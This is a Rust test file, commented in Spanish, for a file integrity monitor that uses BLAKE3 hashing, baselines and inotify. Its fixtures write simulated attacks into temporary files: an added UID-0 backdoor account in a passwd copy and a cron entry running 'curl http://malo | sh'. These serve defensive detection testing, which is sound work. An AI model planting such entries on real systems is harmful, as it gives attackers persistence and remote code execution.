//! Pruebas del monitor de integridad de ficheros.
//!
//! inotify se prueba contra un directorio REAL: se instala el watch, se modifica
//! un fichero y se comprueba que el kernel entrega el evento y que el monitor lo
//! convierte en una alerta de integridad con el hash nuevo. No hay eventos
//! sinteticos donde importa.

use std::path::{Path, PathBuf};

use aegis_fim::baseline::{Baseline, IntegrityChange};
use aegis_fim::hash;
use aegis_fim::monitor::{FimConfig, FimMonitor};

struct Lab(PathBuf);
impl Lab {
    fn nuevo(n: &str) -> Lab {
        let p = std::env::temp_dir().join(format!("aegis-fim-{n}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        Lab(p)
    }
    fn path(&self) -> &Path {
        &self.0
    }
}
impl Drop for Lab {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

// ---------------------------------------------------------------------------
// BLAKE3
// ---------------------------------------------------------------------------

#[test]
fn el_blake3_coincide_con_el_vector_conocido() {
    // Vector oficial de BLAKE3 para la entrada vacia.
    let h = hash::hash_bytes(b"");
    assert_eq!(
        hash::to_hex(&h),
        "af1349b9f5f9a1a6a0404dea36dcc9499bcb25c9adc112b7cc9a93cae41f3262"
    );
    // Y para "abc".
    let h = hash::hash_bytes(b"abc");
    assert_eq!(
        hash::to_hex(&h),
        "6437b3ac38465133ffb63b75273a8db548c558465d79db03fd359c6cd5bd9d85"
    );
}

#[test]
fn el_hasheo_de_fichero_coincide_con_el_de_su_contenido() {
    let lab = Lab::nuevo("filehash");
    let p = lab.path().join("grande.bin");
    let datos: Vec<u8> = (0..200_000u32).flat_map(|i| i.to_le_bytes()).collect();
    std::fs::write(&p, &datos).unwrap();
    assert_eq!(hash::hash_file(&p).unwrap(), hash::hash_bytes(&datos));
}

#[test]
fn el_hasheo_concurrente_da_lo_mismo_que_el_secuencial() {
    let lab = Lab::nuevo("concurrent");
    let mut rutas = Vec::new();
    for i in 0..50 {
        let p = lab.path().join(format!("f{i}.bin"));
        std::fs::write(&p, format!("contenido del fichero numero {i}").repeat(100)).unwrap();
        rutas.push(p);
    }
    let concurrente = hash::hash_files_concurrent(&rutas, 4);
    for (ruta, h) in &concurrente {
        assert_eq!(h.as_ref().unwrap(), &hash::hash_file(ruta).unwrap());
    }
    assert_eq!(concurrente.len(), 50);
}

// ---------------------------------------------------------------------------
// Linea base
// ---------------------------------------------------------------------------

#[test]
fn la_linea_base_detecta_modificacion_alta_y_baja() {
    let lab = Lab::nuevo("baseline");
    let a = lab.path().join("a.conf");
    let b = lab.path().join("b.conf");
    std::fs::write(&a, "config original A").unwrap();
    std::fs::write(&b, "config original B").unwrap();

    let base = Baseline::build(&[a.clone(), b.clone()]);
    assert_eq!(base.len(), 2);

    // Sin cambios: barrido limpio.
    assert!(base.full_scan(&[a.clone(), b.clone()]).is_empty());

    // Se modifica A, se borra B, aparece C.
    std::fs::write(&a, "config MODIFICADA por un atacante").unwrap();
    std::fs::remove_file(&b).unwrap();
    let c = lab.path().join("c.conf");
    std::fs::write(&c, "fichero nuevo sospechoso").unwrap();

    let cambios = base.full_scan(&[a.clone(), b.clone(), c.clone()]);
    assert_eq!(cambios.len(), 3, "{cambios:?}");
    assert!(cambios
        .iter()
        .any(|x| matches!(x, IntegrityChange::Modified { path, .. } if path == &a)));
    assert!(cambios
        .iter()
        .any(|x| matches!(x, IntegrityChange::Removed { path, .. } if path == &b)));
    assert!(cambios
        .iter()
        .any(|x| matches!(x, IntegrityChange::Added { path, .. } if path == &c)));
}

#[test]
fn check_path_solo_mira_un_fichero() {
    let lab = Lab::nuevo("checkpath");
    let a = lab.path().join("shadow");
    std::fs::write(&a, "root:!:...").unwrap();
    let base = Baseline::build(std::slice::from_ref(&a));

    assert!(base.check_path(&a).is_none(), "intacto");
    std::fs::write(&a, "root:$6$hackeado:...").unwrap();
    match base.check_path(&a) {
        Some(IntegrityChange::Modified { was, now, .. }) => assert_ne!(was, now),
        otro => panic!("se esperaba Modified, {otro:?}"),
    }
}

// ---------------------------------------------------------------------------
// inotify de verdad, extremo a extremo
// ---------------------------------------------------------------------------

#[test]
fn inotify_detecta_una_modificacion_real_en_milisegundos() {
    let lab = Lab::nuevo("inotify");
    let critico = lab.path().join("passwd");
    std::fs::write(&critico, "root:x:0:0:root:/root:/bin/bash\n").unwrap();

    let config = FimConfig {
        directories: vec![lab.path().to_path_buf()],
        files: vec![critico.clone()],
    };
    let monitor = FimMonitor::start(&config).expect("inotify tiene que iniciar");
    assert!(monitor.watched_dirs() >= 1);
    assert!(monitor.baseline().get(&critico).is_some());

    // Un atacante anade una cuenta con UID 0.
    std::fs::write(
        &critico,
        "root:x:0:0:root:/root:/bin/bash\npuerta:x:0:0::/root:/bin/bash\n",
    )
    .unwrap();

    // El evento tiene que llegar en decenas de ms; se da un margen amplio.
    let mut detectado = None;
    for _ in 0..20 {
        let cambios = monitor.poll(200).unwrap();
        if let Some(c) = cambios.into_iter().find(|c| c.path() == critico) {
            detectado = Some(c);
            break;
        }
    }
    match detectado {
        Some(IntegrityChange::Modified { was, now, .. }) => {
            assert_ne!(was, now, "el hash tiene que haber cambiado");
        }
        otro => panic!("inotify no entrego la modificacion del fichero critico: {otro:?}"),
    }
}

#[test]
fn inotify_detecta_un_fichero_nuevo_en_el_directorio_vigilado() {
    let lab = Lab::nuevo("newfile");
    // Baseline vacia sobre el directorio.
    let config = FimConfig {
        directories: vec![lab.path().to_path_buf()],
        files: Vec::new(),
    };
    let monitor = FimMonitor::start(&config).unwrap();

    // Aparece un script en cron.d.
    let nuevo = lab.path().join("malicioso.cron");
    std::fs::write(&nuevo, "* * * * * root curl http://malo | sh\n").unwrap();

    let mut detectado = false;
    for _ in 0..20 {
        let cambios = monitor.poll(200).unwrap();
        if cambios
            .iter()
            .any(|c| matches!(c, IntegrityChange::Added { path, .. } if path == &nuevo))
        {
            detectado = true;
            break;
        }
    }
    assert!(
        detectado,
        "no se detecto el fichero nuevo en el directorio vigilado"
    );
}

#[test]
fn aceptar_el_estado_actual_reconoce_una_actualizacion_legitima() {
    let lab = Lab::nuevo("accept");
    let f = lab.path().join("app.conf");
    std::fs::write(&f, "version 1").unwrap();
    let config = FimConfig {
        directories: vec![lab.path().to_path_buf()],
        files: vec![f.clone()],
    };
    let mut monitor = FimMonitor::start(&config).unwrap();

    // Una actualizacion legitima cambia el fichero.
    std::fs::write(&f, "version 2 legitima").unwrap();
    // Antes de aceptar, el barrido lo ve como modificado.
    assert!(!monitor.full_scan().is_empty());
    // Se acepta el nuevo estado como conocido-bueno.
    monitor.accept_current(&f).unwrap();
    // Ahora el barrido esta limpio.
    assert!(
        monitor.full_scan().is_empty(),
        "tras aceptar, no debe haber cambios"
    );
}
